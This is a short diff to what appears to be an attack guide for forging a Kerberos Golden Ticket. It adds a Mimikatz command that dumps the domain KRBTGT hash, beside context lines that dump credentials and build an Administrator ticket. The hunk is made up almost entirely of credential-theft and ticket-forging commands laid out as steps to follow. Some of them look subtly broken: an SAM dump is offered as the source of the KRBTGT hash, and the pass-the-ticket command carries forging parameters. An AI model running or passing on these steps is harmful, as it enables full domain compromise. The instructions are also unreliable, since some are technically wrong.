@@ -128,6 +128,10 @@ First, dump the KRBTGT NTLM hash using Mimikatz:
 
     mimikatz.exe "privilege::debug" "lsadump::sam" exit
 
+    or
+
+    mimikatz # lsadump::lsa /inject /name:krbtgt
+
 Use the extracted NTLM hash to create a Golden Ticket:
 
     mimikatz.exe "kerberos::ptt /user:Administrator /rc4:<KRBTGT NTLM HASH> /domain:example.com /sid:<DOMAIN SID> /ticket:<BASE64 ENCODED TICKET>"
